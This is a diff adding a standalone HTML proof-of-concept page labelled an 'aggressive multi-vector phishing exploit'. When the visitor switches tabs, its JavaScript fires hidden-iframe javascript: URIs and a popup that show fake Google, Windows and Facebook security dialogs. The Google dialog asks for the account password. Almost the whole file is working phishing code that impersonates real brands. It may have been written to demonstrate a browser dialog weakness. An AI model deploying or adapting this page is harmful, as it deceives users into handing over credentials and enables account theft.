@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aggressive PoC: Multi-Vector Phishing Exploit</title>
+</head>
+<body>
+    <h2>Aggressive Phishing PoC - Switch Tabs to Test</h2>
+    <p>This version tries multiple methods to show phishing popups when you switch tabs.</p>
+    
+    <div id="status" style="padding: 10px; background: #d4edda; margin: 10px 0;">
+        Status: Waiting for tab switch...
+    </div>
+
+    <!-- Multiple hidden iframes for different attack vectors -->
+    <iframe id="frame1" style="display:none"></iframe>
+    <iframe id="frame2" style="display:none"></iframe>
+    <iframe id="frame3" style="display:none"></iframe>
+
+    <script>
+        let exploitTriggered = false;
+        
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden && !exploitTriggered) {
+                exploitTriggered = true;
+                document.getElementById('status').innerHTML = 
+                    '<span style="color:red">EXPLOIT TRIGGERED! Check for popups.</span>';
+                
+                console.log('🛑 PHISHING EXPLOIT ACTIVATED');
+                
+                // Method 1: Direct javascript URI (most effective)
+                setTimeout(() => {
+                    try {
+                        document.getElementById('frame1').src = 
+                            "javascript:prompt('Google Security Warning: Unusual activity detected.\\n\\nPlease verify your account password:','')";
+                    } catch(e) {
+                        console.log('Method 1 failed:', e);
+                    }
+                }, 100);
+                
+                // Method 2: Another javascript URI with different social engineering
+                setTimeout(() => {
+                    try {
+                        document.getElementById('frame2').src = 
+                            "javascript:alert('Windows Security: Update required!\\n\\nYour system may be at risk. Please contact IT support immediately.')";
+                    } catch(e) {
+                        console.log('Method 2 failed:', e);
+                    }
+                }, 300);
+                
+                // Method 3: Try to open actual popup window
+                setTimeout(() => {
+                    try {
+                        window.open('https://example.com', 'phishing', 'width=500,height=400');
+                    } catch(e) {
+                        console.log('Method 3 (popup) blocked:', e);
+                    }
+                }, 500);
+            }
+        });
+
+        // Also trigger on blur for maximum effectiveness
+        window.addEventListener('blur', function() {
+            if (!exploitTriggered) {
+                document.addEventListener('visibilitychange', function() {
+                    if (document.hidden) {
+                        document.getElementById('frame3').src = 
+                            "javascript:confirm('Facebook: Session expired.\\n\\nClick OK to re-login and secure your account.')";
+                    }
+                }, {once: true});
+            }
+        });
+
+        console.log('🔒 Aggressive phishing PoC loaded. Switch tabs to test.');
+    </script>
+</body>
+</html>
